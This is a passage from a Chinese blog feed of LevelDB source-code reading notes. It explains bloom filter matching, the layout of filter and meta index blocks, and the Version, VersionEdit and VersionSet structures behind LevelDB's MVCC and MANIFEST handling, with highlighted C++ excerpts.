class="line"></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span>* <span class="built_in">array</span> = bloom_filter.data();</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">size_t</span> bits = (len - <span class="number">1</span>) * <span class="number">8</span>;</span><br><span class="line"></span><br><span class="line"> xxx</span><br><span class="line">      </span><br><span class="line">  <span class="comment">// bloom filter 的hash index判断，只要有一个0，则返回false，都为1，返回true</span></span><br><span class="line">  <span class="keyword">uint32_t</span> h = BloomHash(key);</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">uint32_t</span> delta = (h &gt;&gt; <span class="number">17</span>) | (h &lt;&lt; <span class="number">15</span>);  <span class="comment">// Rotate right 17 bits</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">size_t</span> j = <span class="number">0</span>; j &lt; k; j++) &#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint32_t</span> bitpos = h % bits;</span><br><span class="line">    <span class="keyword">if</span> ((<span class="built_in">array</span>[bitpos / <span class="number">8</span>] &amp; (<span class="number">1</span> &lt;&lt; (bitpos % <span class="number">8</span>))) == <span class="number">0</span>) <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    h += delta;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>假设之前写入了两个data block，一个6kb，一个4kb，则对应的data block和 filter block如下:</p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/leveldb源码阅读-copy-第 12 页 (5).png" style="zoom:33%;" /><p>现在判定一个key是否在data block1, 只用传入data block1起始地址0， 计算得到 index = 0, 则start= 0，limit=9， 所以得到filter的地址未0-9.</p><p>判定一个key是否在data block2， 传入data block2起始地址6k，计算得到index=3，则start=9,limit=15。</p><p>这回答了一个问题，中间 filter offset 1, filter offset 2虽然指向了同一个filter，但是实际上，filter offset2从不会被访问，所以并不影响。==<strong>那为什么要这样设计呢？</strong>==</p><p>想想如何没有这 ”2kb分块“的设计，我们是无法快速的 通过一个block_offset就定位到一个filter offset，进而定位到filter。所以这样的设计还是很巧妙的。</p><p>==<strong>另外，还有个问题</strong>==</p><p>什么时候:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">start == limit</span><br></pre></td></tr></table></figure><p>filter 为空时。 </p><h3 id="2-Meta-Block-在SSTable中的布局"><a href="#2-Meta-Block-在SSTable中的布局" class="headerlink" title="2. Meta Block 在SSTable中的布局"></a>2. Meta Block 在SSTable中的布局</h3><h4 id="1-什么时候写入Meta-Block（持久化-filter-block"><a href="#1-什么时候写入Meta-Block（持久化-filter-block" class="headerlink" title="1. 什么时候写入Meta Block（持久化 filter block)"></a>1. 什么时候写入Meta Block（持久化 filter block)</h4><p>==TableBuilder::Finish==中:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Status <span class="title">TableBuilder::Finish</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  xxx</span><br><span class="line"></span><br><span class="line">  BlockHandle filter_block_handle, metaindex_block_handle, index_block_handle;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Write filter block</span></span><br><span class="line">  <span class="keyword">if</span> (ok() &amp;&amp; r-&gt;filter_block != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">     <span class="comment">// ！！这里写入filter_block！！</span></span><br><span class="line">    WriteRawBlock(r-&gt;filter_block-&gt;Finish(), kNoCompression,</span><br><span class="line">                  &amp;filter_block_handle);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Write metaindex block</span></span><br><span class="line">  <span class="keyword">if</span> (ok()) &#123;</span><br><span class="line">    <span class="function">BlockBuilder <span class="title">meta_index_block</span><span class="params">(&amp;r-&gt;options)</span></span>;</span><br><span class="line">    <span class="keyword">if</span> (r-&gt;filter_block != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">      <span class="comment">// Add mapping from "filter.Name" to location of filter data</span></span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">string</span> key = <span class="string">"filter."</span>;</span><br><span class="line">      key.append(r-&gt;options.filter_policy-&gt;Name());</span><br><span class="line">      <span class="built_in">std</span>::<span class="built_in">string</span> handle_encoding;</span><br><span class="line">      filter_block_handle.EncodeTo(&amp;handle_encoding);</span><br><span class="line">      meta_index_block.Add(key, handle_encoding);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// TODO(postrelease): Add stats and other meta blocks</span></span><br><span class="line">    WriteBlock(&amp;meta_index_block, &amp;metaindex_block_handle);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  xxx</span><br><span class="line">  <span class="keyword">return</span> r-&gt;status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Slice <span class="title">FilterBlockBuilder::Finish</span><span class="params">()</span> </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (!start_.empty()) &#123;</span><br><span class="line">    GenerateFilter();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Append array of per-filter offsets</span></span><br><span class="line">    <span class="comment">// result_.size()是总filter的长度，也是 filter_offsets的起始偏移量</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">uint32_t</span> array_offset = result_.<span class="built_in">size</span>();</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; filter_offsets_.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">    PutFixed32(&amp;result_, filter_offsets_[i]);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  PutFixed32(&amp;result_, array_offset);</span><br><span class="line">    <span class="comment">// filter编码参数</span></span><br><span class="line">  result_.push_back(kFilterBaseLg);  <span class="comment">// Save encoding parameter in result</span></span><br><span class="line">  <span class="keyword">return</span> Slice(result_);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-Meta-Block（filter-block）-amp-Meta-Index-Block的布局"><a href="#2-Meta-Block（filter-block）-amp-Meta-Index-Block的布局" class="headerlink" title="2. Meta Block（filter block）&amp; Meta Index Block的布局"></a>2. Meta Block（filter block）&amp; Meta Index Block的布局</h4><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/leveldb源码阅读-copy-filter block的layout (1).png" style="zoom:50%;" /><h4 id="3-meta-index-block的写入"><a href="#3-meta-index-block的写入" class="headerlink" title="3. meta index block的写入"></a>3. meta index block的写入</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Write metaindex block</span></span><br><span class="line"><span class="keyword">if</span> (ok()) &#123;</span><br><span class="line">  <span class="function">BlockBuilder <span class="title">meta_index_block</span><span class="params">(&amp;r-&gt;options)</span></span>;</span><br><span class="line">  <span class="keyword">if</span> (r-&gt;filter_block != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">    <span class="comment">// Add mapping from "filter.Name" to location of filter data</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> key = <span class="string">"filter."</span>;</span><br><span class="line">    key.append(r-&gt;options.filter_policy-&gt;Name());</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">string</span> handle_encoding;</span><br><span class="line">    filter_block_handle.EncodeTo(&amp;handle_encoding);</span><br><span class="line">    meta_index_block.Add(key, handle_encoding);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// TODO(postrelease): Add stats and other meta blocks</span></span><br><span class="line">  WriteBlock(&amp;meta_index_block, &amp;metaindex_block_handle);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>meta index block和 data block以及index block一样，都是BlockBuilder类型。</p><p>key: meta index block的key是 <strong>filter.Name</strong>, 其中，Name来自 filter_policy-&gt;Name()调用。</p><p>value:  value是filter_block_handle,也就是 filter_block的位置信息。 还记得位置信息是在哪里生成的吗？</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="comment">// Write filter block</span></span><br><span class="line">  <span class="keyword">if</span> (ok() &amp;&amp; r-&gt;filter_block != <span class="literal">nullptr</span>) &#123;</span><br><span class="line">     <span class="comment">// !! 这里生成的 filter_block_handle信息s</span></span><br><span class="line">    WriteRawBlock(r-&gt;filter_block-&gt;Finish(), kNoCompression,</span><br><span class="line">                  &amp;filter_block_handle);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Write metaindex block</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> leveldb </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>leveldb源码阅读记录-Version数据结构及MANIFEST文件</title>
      <link href="/archives/90a4812e.html"/>
      <url>/archives/90a4812e.html</url>
      
        <content type="html"><![CDATA[<p>文本要介绍一个在leveldb中相当重要的数据结构 - Version及其相关的VersionEdit和VersionSet。理解了这些内容后，我们会提到leveldb系统中MANIFEST文件。</p><a id="more"></a><h1 id="1-Version"><a href="#1-Version" class="headerlink" title="1. Version"></a>1. Version</h1><p>为什么要用version控制？</p><p>对于同一笔记录，如果读和写同一时间发生，reader可能读到不一致的数据或者是修改了一半的数据。对于这种情况，有三种常见的解决方法：</p><ul><li>悲观锁  ，最简单的处理方式，就是加锁保护，写的时候不许读，读的时候不许写。效率低。 </li><li>乐观锁   它假设多用户并发的事物在处理时不会彼此互相影响，各事务能够在不产生锁的的情况下处理各自影响的那部分数据。在提交数据更新之前，每个事务会先检查在该事务读取数据后，有没有其他事务又修改了该数据。 果其他事务有更新的话，正在提交的事务会进行回滚;这样做不会有锁竞争更不会产生死锁， 但如果数据竞争的概率较高，效率也会受影响 。</li><li>MVCC，MVCC是一个数据库常用的概念。Multiversion concurrency control多版本并发控制。每一个执行操作的用户，看到的都是数据库特定时刻的的快照(snapshot), writer的任何未完成的修改都不会被其他的用户所看到;当对数据进行更新的时候并是不直接覆盖，而是先进行标记, 然后在其他地方添加新的数据，从而形成一个新版本, 此时再来读取的reader看到的就是最新的版本了。所以这种处理策略是维护了多个版本的数据的,但只有一个是最新的。</li></ul><p>leveldb中的version就是MVCC思想的体现。</p><h2 id="1-VersionEdit结构"><a href="#1-VersionEdit结构" class="headerlink" title="1. VersionEdit结构"></a>1. VersionEdit结构</h2><p>前面说了整个version相关的数据结构是用来实现MVCC的，这也意味这系统中存在多个版本，那我们是如何从上一个历史版本走到这个版本的？这就是通过VersionEdit来实现的。</p><p>VersionEdit是LevelDB两个Version之间的差量，即：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Versoin0 + VersoinEdit &#x3D; Version1</span><br></pre></td></tr></table></figure><p>差量包括本次操作，新增的文件和删除的文件。</p><p>看看VersionEdit的成员：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span>:</span><br><span class="line"> <span class="keyword">friend</span> <span class="class"><span class="keyword">class</span> <span class="title">VersionSet</span>;</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">typedef</span> <span class="built_in">std</span>::<span class="built_in">set</span>&lt;<span class="built_in">std</span>::pair&lt;<span class="keyword">int</span>, <span class="keyword">uint64_t</span>&gt;&gt; DeletedFileSet;</span><br><span class="line"></span><br><span class="line"> <span class="built_in">std</span>::<span class="built_in">string</span> comparator_;</span><br><span class="line"> <span class="keyword">uint64_t</span> log_number_;</span><br><span class="line"> <span class="keyword">uint64_t</span> prev_log_number_;</span><br><span class="line"> <span class="keyword">uint64_t</span> next_file_number_;</span><br><span class="line"> SequenceNumber last_sequence_;</span><br><span class="line"> <span class="keyword">bool</span> has_comparator_;</span><br><span class="line"> <span class="keyword">bool</span> has_log_number_;</span><br><span class="line"> <span class="keyword">bool</span> has_prev_log_number_;</span><br><span class="line"> <span class="keyword">bool</span> has_next_file_number_;</span><br><span class="line"> <span class="keyword">bool</span> has_last_sequence_;</span><br><span class="line"></span><br><span class="line"> <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::pair&lt;<span class="keyword">int</span>, InternalKey&gt;&gt; compact_pointers_;<span class="comment">// 存放这个version的压缩指针，pair.first对应哪一个level， pair.second 对应哪一个key开始compaction</span></span><br><span class="line"> DeletedFileSet deleted_files_;<span class="comment">// 本次操作要删除的文件</span></span><br><span class="line"> <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::pair&lt;<span class="keyword">int</span>, FileMetaData&gt;&gt; new_files_;<span class="comment">// 本次操作新增的文件</span></span><br></pre></td></tr></table></figure><p>关注最后3个， compacton_pointers暂时不管，<strong>delted_files_, new_files_是这次版本修改的差量。</strong></p><p><strong>关注new_files_中的FileMetaData，因为一次版本修改新增的文件是这个类的集合，</strong></p><h2 id="2-FileMetaData"><a href="#2-FileMetaData" class="headerlink" title="2. FileMetaData"></a>2. FileMetaData</h2><p>FileMetaData是每个Version内部维持的文件，每层中都有多个FileMetaData， 一个FileMetaData用于描述一个sstable的相关信息，是sstable的元数据。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">FileMetaData</span> &#123;</span></span><br><span class="line">  FileMetaData() : refs(<span class="number">0</span>), allowed_seeks(<span class="number">1</span> &lt;&lt; <span class="number">30</span>), file_size(<span class="number">0</span>) &#123;&#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">int</span> refs;</span><br><span class="line">  <span class="keyword">int</span> allowed_seeks;  <span class="comment">// Seeks allowed until compaction，用于基于seek compaction</span></span><br><span class="line">  <span class="keyword">uint64_t</span> number;<span class="comment">// 这个number用来唯一标识一个sstable，还记得文件命名中的编号吗？</span></span><br><span class="line">  <span class="keyword">uint64_t</span> file_size;    <span class="comment">// File size in bytes 文件大小</span></span><br><span class="line">  InternalKey smallest;  <span class="comment">// Smallest internal key served by table 最小key</span></span><br><span class="line">  InternalKey largest;   <span class="comment">// Largest internal key served by table 最大key</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>各字段都在注释中解释，我们可以得到一个信息，在SSTable中存放的是key是InternalKey， 对应了 <a href="https://www.ravenxrz.ink/archives/aba77258.html">MemTable</a> 文章中说的Key类型。</p><h2 id="3-Version结构"><a href="#3-Version结构" class="headerlink" title="3. Version结构"></a>3. Version结构</h2><p>来看看Version的成员：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span>:</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里看出leveldb在系统中维护的version组成一个链表，且系统中可能存在多个VersionSet。每个Set维护一（多）组Version</span></span><br><span class="line"> VersionSet* vset_;  <span class="comment">// VersionSet to which this Version belongs</span></span><br><span class="line"> Version* next_;     <span class="comment">// Next version in linked list</span></span><br><span class="line"> Version* prev_;     <span class="comment">// Previous version in linked list</span></span><br><span class="line"> <span class="keyword">int</span> refs_;          <span class="comment">// Number of live refs to this version  // 引用计数，估计和回收Version相关</span></span><br><span class="line"></span><br><span class="line"> <span class="comment">// 每层的files, 每个file都是FileMetadata</span></span><br><span class="line"> <span class="comment">// List of files per level</span></span><br><span class="line"> <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;FileMetaData*&gt; files_[<span class="built_in">config</span>::kNumLevels];</span><br><span class="line"></span><br><span class="line"> <span class="comment">// Next file to compact based on seek stats.</span></span><br><span class="line"> FileMetaData* file_to_compact_;<span class="comment">// compaction过程会用到</span></span><br><span class="line"> <span class="keyword">int</span> file_to_compact_level_;</span><br><span class="line"></span><br><span class="line"> <span class="comment">// compaction相关，根据compactoin_score_决定是否需要compaction</span></span><br><span class="line"> <span class="comment">// Level that should be compacted next and its compaction score.</span></span><br><span class="line"> <span class="comment">// Score &lt; 1 means compaction is not strictly needed.  These fields</span></span><br><span class="line"> <span class="comment">// are initialized by Finalize().</span></span><br><span class="line"> <span class="keyword">double</span> compaction_score_;</span><br><span class="line"> <span class="keyword">int</span> compaction_level_;</span><br></pre></td></tr></table></figure><p>next_和prev_指针，表明version之间组成一个双链表。</p><p>files_表示了这个版本下整个系统的所有sstable的元数据。</p><p>下面是和compaction相关的结构。</p><h2 id="4-VersionSet结构"><a href="#4-VersionSet结构" class="headerlink" title="4. VersionSet结构"></a>4. VersionSet结构</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span>:</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Builder</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">friend</span> <span class="class"><span class="keyword">class</span> <span class="title">Compaction</span>;</span></span><br><span class="line"><span class="keyword">friend</span> <span class="class"><span class="keyword">class</span> <span class="title">Version</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">ReuseManifest</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; dscname, <span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span>&amp; dscbase)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Finalize</span><span class="params">(Version* v)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetRange</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;FileMetaData*&gt;&amp; inputs, InternalKey* smallest,</span></span></span><br><span class="line"><span class="function"><span class="params">InternalKey* largest)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">GetRange2</span><span class="params">(<span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;FileMetaData*&gt;&amp; inputs1,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;FileMetaData*&gt;&amp; inputs2,</span></span></span><br><span class="line"><span class="function"><span class="params">InternalKey* smallest, InternalKey* largest)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">SetupOtherInputs</span><span class="params">(Compaction* c)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Save current contents to *log</span></span><br><span class="line"><span class="function">Status <span class="title">WriteSnapshot</span><span class="params">(<span class="built_in">log</span>::Writer* <span class="built_in">log</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">AppendVersion</span><span class="params">(Version* v)</span></span>;</span><br><span class="line"></span><br><span class="line">Env* <span class="keyword">const</span> env_;</span><br><span class="line"><span class="keyword">const</span> <span class="built_in">std</span>::<span class="built_in">string</span> dbname_;</span><br><span class="line"><span class="keyword">const</span> Options* <span class="keyword">const</span> options_;</span><br><span class="line">TableCache* <span class="keyword">const</span> table_cache_;<span class="comment">// cache相关</span></span><br><span class="line"><span class="keyword">const</span> InternalKeyComparator icmp_;<span class="comment">// 比较器</span></span><br><span class="line"><span class="keyword">uint64_t</span> next_file_number_;<span class="comment">// !!!前面文件编号文章中重点想说的就是这个变量</span></span><br><span class="line"><span class="keyword">uint64_t</span> manifest_file_number_;<span class="comment">// 当前manifest文件</span></span><br><span class="line"><span class="keyword">uint64_t</span> last_sequence_;<span class="comment">// 这个序列号是用来表示Internal key中的序列号</span></span><br><span class="line"><span class="keyword">uint64_t</span> log_number_;<span class="comment">// log文件序列号</span></span><br><span class="line"><span class="keyword">uint64_t</span> prev_log_number_;  <span class="comment">// 0 or backing store for memtable being compacted</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Opened lazily</span></span><br><span class="line">WritableFile* descriptor_file_;</span><br><span class="line"><span class="built_in">log</span>::Writer* descriptor_log_;</span><br><span class="line">Version dummy_versions_;  <span class="comment">// Head of circular doubly-linked list of versions.链表head</span></span><br><span class="line">Version* current_;        <span class="comment">// == dummy_versions_.prev_ 当前version</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 下一次compaction时，每层compaction的开始key</span></span><br><span class="line"><span class="comment">// Per-level key at which the next compaction at that level should start.</span></span><br><span class="line"><span class="comment">// Either an empty string, or a valid InternalKey.</span></span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> compact_pointer_[<span class="built_in">config</span>::kNumLevels];</span><br></pre></td></tr></table></figure><p>VersionSet维护了所有有效的version，内部采用双链表的结构来维护。</p><p>下图展示了这几个数据结构之间的关系，引用自：<span class="exturl" data-url="aHR0cHM6Ly9iZWFuLWxpLmdpdGh1Yi5pby9sZXZlbGRiLXZlcnNpb24v" title="https://bean-li.github.io/leveldb-version/">https://bean-li.github.io/leveldb-version/<i class="fa fa-external-link"></i></span></p><p><img data-src="https://bean-li.github.io/assets/LevelDB/version_versionset.png" alt="img"></p><p>一个version维护整个系统中的所有sstable文件的元数据，versionset维护多个version，显然我们不可能无限增加version个数。那如何清理version？</p><p>LevelDB会触发Compaction，能对一些文件进行清理操作，让数据更加有序，清理后的数据放到新的版本里面，而老的数据作为原始的素材，最终是要清理掉的，但是如果有读事务位于旧的文件，那么暂时就不能删除。因此利用引用计数，只要一个Verison还活着，就不允许删除该Verison管理的所有文件。当一个Version生命周期结束，它管理的所有文件的引用计数减1.</p><p>当一个version被销毁时，每个和它想关联的file的引用计数都会-1，当引用计数小于=0时，file被删除：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">Version::~Version() &#123;</span><br><span class="line">  assert(refs_ == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Remove from linked list</span></span><br><span class="line">  prev_-&gt;next_ = next_;</span><br><span class="line">  next_-&gt;prev_ = prev_;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Drop references to files</span></span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">int</span> level = <span class="number">0</span>; level &lt; <span class="built_in">config</span>::kNumLevels; level++) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">size_t</span> i = <span class="number">0</span>; i &lt; files_[level].<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">      FileMetaData* f = files_[level][i];</span><br><span class="line">      assert(f-&gt;refs &gt; <span class="number">0</span>);</span><br><span class="line">      f-&gt;refs--;</span><br><span class="line">      <span class="keyword">if</span> (f-&gt;refs &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">delete</span> f;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="2-如何应用VersionEdit-Version-New-Version"><a href="#2-如何应用VersionEdit-Version-New-Version" class="headerlink" title="2. 如何应用VersionEdit+Version = New Version"></a>2. 如何应用VersionEdit+Version = New Version</h1><p>前面说到， Version + VersionEdit = new Version，如何应用这个增量呢？</p><p>具体的操作是在VersionSet中的Builder中的。</p><p>首先可以看到，Builder是在 LogAndApply和Recover中被调用的：</p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200917210900575.png" alt="image-20200917210900575" style="zoom:50%;" /><p>重点看一下LogAndApply</p><img data-src="https://cdn.jsdelivr.net/gh/ravenxrz/PicBed/img/image-20200917210931871.png" alt="image-20200917210931871" style="zoom:50%;" /><p>可以看到，一共有4个函数调用了LogAndApply，DB打开时，其余3个都是和Compaction相关。</p><h2 id="1-VersionEdit记录一次操作中涉及的文件过程"><a href="#1-VersionEdit记录一次操作中涉及的文件过程" class="headerlink" title="1. VersionEdit记录一次操作中涉及的文件过程"></a>1. VersionEdit记录一次操作中涉及的文件过程</h2><blockquote><p>因为和Compaction过程相关，所以初次看不懂没关系，只用记住VersionEdit是用来保存一次操作过程涉及的文件的差量的。</p></blockquote><p>说LogAndApply之前，先说一下VersionEdit是如何保存一次操作过程中的涉及的文件的：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">private</span>:</span><br><span class="line"> <span class="keyword">friend</span> <span class="class"><span class="keyword">class</span> <span class="title">VersionSet</span>;</span></span><br><span class="line"></span><br><span class="line"> <span class="keyword">typedef</span> <span class="built_in">std</span>::<span class="built_in">set</span>&lt;<span class="built_in">std</span>::pair&lt;<span class="keyword">int</span>, <span class="keyword">uint64_t</span>&gt;&gt; DeletedFileSet; <span class="comment">// level和filenumber的pair</span></span><br><span class="line">DeletedFileSet deleted_files_;</span><br><span class="line"> <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="built_in">std</span>::pair&lt;<span class="keyword">int</span>, FileMetaData&gt;&gt; new_files_;<span class="comment">// level和filemetadata</span></span><br></pre></td></tr></table></figure><p>先看==<strong>deleted_files_</strong>:==</p><p>只在RemoveFile函数调用中，增加。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Delete the specified "file" from the specified "level".</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span 